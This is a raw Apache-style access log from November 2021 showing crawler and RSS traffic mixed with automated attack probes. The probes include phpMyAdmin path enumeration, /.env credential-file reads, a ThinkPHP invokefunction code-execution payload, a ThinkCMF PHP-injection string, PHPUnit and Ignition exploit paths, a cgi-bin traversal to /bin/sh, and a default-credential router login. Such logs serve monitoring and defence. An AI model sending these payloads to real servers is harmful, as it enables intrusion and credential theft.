35.217.2.160 - - [29/Nov/2021:21:14:13 +0000] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:13 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:13 +0000] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:14 +0000] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:14 +0000] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:14 +0000] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:14 +0000] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:14 +0000] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:14 +0000] "GET /pma2017/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:15 +0000] "GET /sql/sql/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:15 +0000] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:15 +0000] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:15 +0000] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:15 +0000] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:15 +0000] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:15 +0000] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:16 +0000] "GET /db/index.php?lang=en HTTP/1.1" 301 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:16 +0000] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:16 +0000] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:16 +0000] "GET /pma2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:16 +0000] "GET /pma2017/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:16 +0000] "GET /pma2014/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:16 +0000] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:16 +0000] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:17 +0000] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:17 +0000] "GET /phppma/index.php?lang=en HTTP/1.1" 301 254 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:17 +0000] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:17 +0000] "GET /PMA2020/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:17 +0000] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:17 +0000] "GET /pma2014/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
167.71.135.56 - - [29/Nov/2021:21:31:18 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.71.135.56 - - [29/Nov/2021:21:31:18 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.239.11.46 - - [29/Nov/2021:21:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
114.119.133.35 - - [29/Nov/2021:21:41:56 +0000] "GET /blog/tags/Economics.html HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
138.68.133.88 - - [29/Nov/2021:21:48:52 +0000] "\x16\x03\x01\x01\xfc\x01" 400 226 "-" "-"
164.92.248.37 - - [29/Nov/2021:21:49:53 +0000] "\x16\x03\x01\x01\xfc\x01" 400 226 "-" "-"
192.241.215.147 - - [29/Nov/2021:21:52:47 +0000] "GET /hudson HTTP/1.1" 301 236 "-" "Mozilla/5.0 zgrab/0.x"
165.232.137.148 - - [29/Nov/2021:22:07:40 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
165.232.137.148 - - [29/Nov/2021:22:07:40 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.153.66.66 - - [29/Nov/2021:22:09:21 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
185.191.171.14 - - [29/Nov/2021:22:20:00 +0000] "GET /blog/2014/2/1/Encryption%20and%20Amateur%20Radio.html HTTP/1.1" 301 274 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
207.46.13.126 - - [29/Nov/2021:22:33:34 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
177.11.138.132 - - [29/Nov/2021:22:39:21 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
69.164.211.90 - - [29/Nov/2021:22:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
216.244.66.232 - - [29/Nov/2021:22:41:55 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
167.71.135.82 - - [29/Nov/2021:22:49:27 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.71.135.82 - - [29/Nov/2021:22:49:27 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.199.52.249 - - [29/Nov/2021:22:54:59 +0000] "GET / HTTP/1.0" 301 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
66.249.93.244 - - [29/Nov/2021:23:00:14 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
209.153.66.66 - - [29/Nov/2021:23:06:52 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
143.110.227.92 - - [29/Nov/2021:23:08:31 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.227.92 - - [29/Nov/2021:23:08:31 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
216.244.66.232 - - [29/Nov/2021:23:27:57 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
184.149.61.56 - - [29/Nov/2021:23:39:50 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
172.104.217.53 - - [29/Nov/2021:23:41:23 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
101.34.187.218 - - [29/Nov/2021:23:43:11 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler ; EmbeddedWB 14.52 from: http://www.bsalsa.com/ EmbeddedWB 14.52; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.590; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
101.34.187.218 - - [29/Nov/2021:23:43:13 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
101.34.187.218 - - [29/Nov/2021:23:43:15 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
42.83.147.34 - - [29/Nov/2021:23:47:22 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
199.58.86.211 - - [29/Nov/2021:23:55:18 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
199.58.86.211 - - [29/Nov/2021:23:55:20 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
198.71.226.19 - - [29/Nov/2021:23:57:43 +0000] "GET / HTTP/1.1" 301 227 "-" "-"
209.153.66.66 - - [30/Nov/2021:00:02:46 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
220.181.51.120 - - [30/Nov/2021:00:02:53 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
216.244.66.232 - - [30/Nov/2021:00:14:11 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
104.248.18.83 - - [30/Nov/2021:00:17:18 +0000] "\x16\x03\x01\x01\xfc\x01" 400 226 "-" "-"
193.142.58.22 - - [30/Nov/2021:00:22:37 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.222.253.20 - - [30/Nov/2021:00:22:54 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
85.208.98.23 - - [30/Nov/2021:00:28:06 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)"
50.116.54.8 - - [30/Nov/2021:00:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
103.195.100.93 - - [30/Nov/2021:00:49:33 +0000] "GET /explore HTTP/1.1" 301 237 "-" "-"
209.153.66.66 - - [30/Nov/2021:00:54:41 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
88.218.67.121 - - [30/Nov/2021:01:31:54 +0000] "GET /datasheets/st/3303.pdf HTTP/1.1" 301 249 "http://www.datasheetcafe.com/42568wp-datasheet-eeprom/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.2052.190 Safari/537.36"
94.232.43.63 - - [30/Nov/2021:01:33:56 +0000] "\x03" 400 226 "-" "-"
94.232.43.63 - - [30/Nov/2021:01:33:56 +0000] "\x03" 400 226 "-" "-"
97.107.132.77 - - [30/Nov/2021:01:41:20 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
194.93.0.40 - - [30/Nov/2021:01:48:39 +0000] "GET /robots.txt HTTP/1.0" 301 237 "-" "Mozilla/4.0 (compatible; fluid/0.0; +http://www.leak.info/bot.html)"
209.153.66.66 - - [30/Nov/2021:01:49:26 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
114.119.130.26 - - [30/Nov/2021:01:59:40 +0000] "GET /blog/tags/AP30.html HTTP/1.1" 301 246 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
45.146.164.110 - - [30/Nov/2021:02:22:25 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
209.153.66.66 - - [30/Nov/2021:02:36:53 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
69.164.211.90 - - [30/Nov/2021:02:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
49.7.20.67 - - [30/Nov/2021:02:45:59 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
114.119.133.35 - - [30/Nov/2021:03:00:13 +0000] "GET /blog/tags/ISO%209660.html HTTP/1.1" 301 250 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.162.235.164 - - [30/Nov/2021:03:02:54 +0000] "GET /api/productConfig HTTP/1.1" 400 226 "-" "-"
183.136.225.9 - - [30/Nov/2021:03:08:14 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.9 - - [30/Nov/2021:03:08:17 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.9 - - [30/Nov/2021:03:08:20 +0000] "GET /favicon.ico HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.9 - - [30/Nov/2021:03:08:51 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
114.119.133.35 - - [30/Nov/2021:03:21:54 +0000] "GET /blog/tags/CSU.html HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
143.198.38.87 - - [30/Nov/2021:03:22:56 +0000] "GET / HTTP/1.0" 301 227 "-" "-"
45.146.164.110 - - [30/Nov/2021:03:23:26 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.132.227.198 - - [30/Nov/2021:03:37:51 +0000] "HEAD / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
186.33.73.174 - - [30/Nov/2021:03:40:07 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.79.148.82 - - [30/Nov/2021:03:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
3.236.73.183 - - [30/Nov/2021:03:55:45 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
45.146.164.110 - - [30/Nov/2021:03:57:14 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 298 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
3.144.139.93 - - [30/Nov/2021:04:02:39 +0000] "GET /.env HTTP/1.1" 301 231 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
216.244.66.232 - - [30/Nov/2021:04:08:46 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
209.153.66.66 - - [30/Nov/2021:04:26:07 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
50.116.54.8 - - [30/Nov/2021:04:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
185.191.171.38 - - [30/Nov/2021:04:44:43 +0000] "GET /datasheets/breezecom/ HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.232 - - [30/Nov/2021:04:56:12 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
194.104.136.109 - - [30/Nov/2021:04:59:11 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
45.146.164.110 - - [30/Nov/2021:05:07:59 +0000] "GET /console/ HTTP/1.1" 301 238 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
178.73.215.171 - - [30/Nov/2021:05:20:03 +0000] "GET / HTTP/1.0" 301 227 "-" "-"
209.153.66.66 - - [30/Nov/2021:05:22:22 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
5.2.72.124 - - [30/Nov/2021:05:36:59 +0000] "SSH-2.0-PuTTY_Release_0.63" 400 226 "-" "-"
66.249.79.16 - - [30/Nov/2021:05:39:18 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.14 - - [30/Nov/2021:05:39:19 +0000] "GET /ads.txt HTTP/1.1" 301 234 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
97.107.141.188 - - [30/Nov/2021:05:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
216.244.66.232 - - [30/Nov/2021:05:45:25 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
45.146.164.110 - - [30/Nov/2021:06:07:27 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.35.168.144 - - [30/Nov/2021:06:08:14 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 zgrab/0.x"
209.153.66.66 - - [30/Nov/2021:06:15:56 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
43.131.24.202 - - [30/Nov/2021:06:19:45 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
216.244.66.232 - - [30/Nov/2021:06:33:42 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
45.79.148.82 - - [30/Nov/2021:06:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
45.146.164.110 - - [30/Nov/2021:06:44:39 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.86.35.22 - - [30/Nov/2021:06:48:29 +0000] "GET / HTTP/1.1" 301 228 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
209.153.66.66 - - [30/Nov/2021:07:06:33 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-df7b2e7 (https://tt-rss.org/)"
45.146.164.110 - - [30/Nov/2021:07:28:45 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
50.116.54.8 - - [30/Nov/2021:07:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
42.230.192.192 - - [30/Nov/2021:07:44:51 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 301 279 "-" "-"
49.7.20.67 - - [30/Nov/2021:07:48:13 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
95.173.161.74 - - [30/Nov/2021:07:48:29 +0000] "GET /.env HTTP/1.1" 301 232 "-" "python-requests/2.25.1"
157.55.39.194 - - [30/Nov/2021:07:52:23 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
